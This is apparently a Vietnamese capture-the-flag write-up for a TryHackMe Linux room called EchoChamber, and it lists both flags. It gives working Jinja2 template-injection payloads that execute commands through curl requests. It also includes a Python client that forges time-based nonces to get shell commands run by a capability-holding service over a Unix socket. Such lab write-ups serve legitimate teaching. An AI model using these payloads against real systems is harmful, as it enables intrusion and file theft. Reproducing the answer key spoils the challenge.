---
title: "EchoChamber"
category: "Boot2Root"
tags: ["ssti", "linux-capabilities"]
solve_date: "2026-10-11T04:56:00+07:00"
language: "vi"
---

# EchoChamber

**Flag (user):** `isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}`
**Flag (root):** `isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}`
**Artifact:** none supplied. Target ECHOCHAMBER, deployed via <https://tryhackme.com/jr/cryovault20263>; both flags live on the host.

| Path | Owner:group | Mode | Size | Role |
|---|---|---|---|---|
| `/var/lib/warden/real/user.txt` | `sentinel:sentinel` | `0640` | 44 B | real user flag |
| `/var/lib/warden/real/root.txt` | `root:root` | `0600` | 45 B | real root flag |
| `/var/lib/warden/decoy/user.txt` | `root:root` | `0644` | 29 B | decoy, `isfcr{echoes_sound_the_same}` |
| `/var/lib/warden/decoy/root.txt` | `root:root` | `0644` | 27 B | decoy, `isfcr{s0_cl0se_but_s0_f4r}` |
| `/home/sentinel/user.txt` | `root:root` | `0777` | symlink | swapped by warden between the two directories |
| `/root/root.txt` | `root:root` | `0777` | symlink | swapped by warden between the two directories |
| `/etc/sentinel/dispatch.json` | `root:root` | `0777` | symlink | swapped by warden; selects the sentinel operation table |
| `/run/sentinel/ctrl.sock` | `sentinel:sentinel` | `0666` | socket | the privilege boundary |

## Đề bài

EchoChamber là máy Linux được truy cập qua một console xem cảnh báo. Mục tiêu là lấy user flag và root flag, đồng thời phân biệt file thật với các file decoy do `warden` thay đổi qua symlink.

## Phân tích

Máy có SSH, nginx chuyển tiếp tới Flask và LLMNR. Trang login công bố credential lab `analyst / analyst`. Dashboard cho biết endpoint preview, classifier, log verdict và dispatch table của sentinel.

Không có `sentinel-admin` hoặc script rotate được nêu trong cấu hình SUID. Hướng khai thác hữu ích là `sentinel.service`: chạy dưới user `sentinel` với `CAP_DAC_READ_SEARCH`. Capability này cho phép bỏ qua kiểm tra đọc file và duyệt thư mục, nên có thể đọc root flag mà không cần shell UID 0.

## Lời giải

1. Đăng nhập bằng credential công bố trên trang. Kiểm tra preview với `{{7*7}}`; kết quả 49 trong cả hai trường xác nhận Jinja2 template được thực thi.
2. Dùng globals của lớp `config` để gọi lệnh. Context này chạy dưới user `analyst`, thuộc nhóm `echo-log`.
3. Đọc `/opt/warden/warden.py` trước khi ghi log. Verdict `human` giữ symlink ở `real/`; verdict `agent` còn mới dưới 20 giây chuyển chúng sang `decoy/`. Không ghi verdict giả để đổi trạng thái. Đối chiếu nội dung, kích thước và đích symlink để loại decoy.
4. Sentinel nhận JSON qua socket `/run/sentinel/ctrl.sock` có mode `0666`. Dispatch thật có operation `shell`, handler `exec_shell`, gate `nonce_time`; dispatch decoy không có operation này. Nonce được tính từ salt đọc được và bộ đếm phút, chấp nhận lệch -1, 0 hoặc +1.
5. Khi `warden.state` đang là `human`, ghi `pause` để tạm dừng đổi symlink trong 60 giây. Gửi request shell với payload base64. Tiến trình con kế thừa capability đọc file.
6. Trong cùng một lệnh, đọc hai flag và liệt kê đích symlink. Output đọc root trước, user sau. Kích thước chuỗi cộng newline khớp file thật 45 và 44 byte; symlink đều trỏ vào `/var/lib/warden/real/`.

   ```
   {{config.__class__.__init__.__globals__["os"].popen("<command>").read()}}
   ```

   ```python
   src_root   = REAL if mode == "human" else DECOY
   agent_live = any(v == "agent" and (now - t) < VERDICT_STALE_S for t, v in sid_last.values())
   ```

   ```python
   SALT  = "sentinel-salt-v1-a3b7c2d9"
   nonce = hashlib.sha256(f"{int(time.time()) // 60}:{SALT}".encode()).hexdigest()[:16]
   ```

   ```text
   {"ok": true, "rc": 0, "stdout": "isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}\n
    isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}\n---\n
    lrwxrwxrwx 1 root root 29 ... /home/sentinel/user.txt -> /var/lib/warden/real/user.txt\n
    lrwxrwxrwx 1 root root 29 ... /root/root.txt -> /var/lib/warden/real/root.txt\n"}
   ```

## Kết quả

User flag có phản hồi `Correct Answer` trên TryHackMe. Bản nguồn ghi root flag được chấp nhận qua luồng hoàn thành room nhưng không lưu banner riêng của đáp án root. Không có phản hồi đối chiếu với scoreboard CTF cho hai flag.

`echochamber-user` — `isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}`

`echochamber-root` — `isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}`

## Tái hiện

Dựng box và thao tác từ AttackBox có route tới mạng lab. Các block dưới đây lần lượt đăng nhập, kiểm tra SSTI, đọc trạng thái warden, tạo client `sent.py` và chạy client qua command channel. Giữ các escape trong JSON/shell như bản nguồn. Nếu đọc được một trong hai flag decoy, kiểm tra lại `warden.state` và symlink; không coi chúng là flag thật.

```text
nmap -sC -sV -p- <TARGET>
curl -s -i -c /tmp/c.txt -d 'username=analyst&password=analyst' http://<TARGET>/login
curl -s -b /tmp/c.txt http://<TARGET>/dashboard          # read the five alerts
```

```text
curl -s -b /tmp/c.txt -H 'Content-Type: application/json' \
  -d '{"title":"A{{7*7}}B","body":"C{{7*7}}D"}' \
  http://<TARGET>/api/alert/preview

curl -s -b /tmp/c.txt -H 'Content-Type: application/json' \
  -d '{"title":"x","body":"{{config.__class__.__init__.__globals__[\"os\"].popen(\"<COMMAND>\").read()}}"}' \
  http://<TARGET>/api/alert/preview
```

```text
cat /etc/systemd/system/sentinel.service /etc/systemd/system/echo-warden.service
cat /opt/warden/warden.py /opt/sentinel/sentinel.py /opt/sentinel/tools/dd-wrapper.c
readlink -f /etc/sentinel/dispatch.json; cat /var/lib/warden/warden.state
```

```python
import socket, json, base64, hashlib, time
SALT = "sentinel-salt-v1-a3b7c2d9"
def nonce(off=0):
    t = (int(time.time()) // 60) + off
    return hashlib.sha256(("%d:%s" % (t, SALT)).encode()).hexdigest()[:16]
cmd = "cat /root/root.txt /home/sentinel/user.txt; ls -l /root/root.txt /home/sentinel/user.txt"
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/sentinel/ctrl.sock")
s.sendall(json.dumps({"op": "shell", "nonce": nonce(),
                      "payload": base64.b64encode(cmd.encode()).decode()}).encode() + b"\n")
print(s.recv(200000).decode("utf-8", "replace"))
```

```text
B=$(base64 -w0 sent.py)
curl -s -b /tmp/c.txt -H 'Content-Type: application/json' \
  -d '{"title":"x","body":"{{config.__class__.__init__.__globals__[\"os\"].popen(\"printf pause > /opt/echochamber/pause; sleep 1; echo '"$B"' | base64 -d | python3\").read()}}"}' \
  http://<TARGET>/api/alert/preview
```
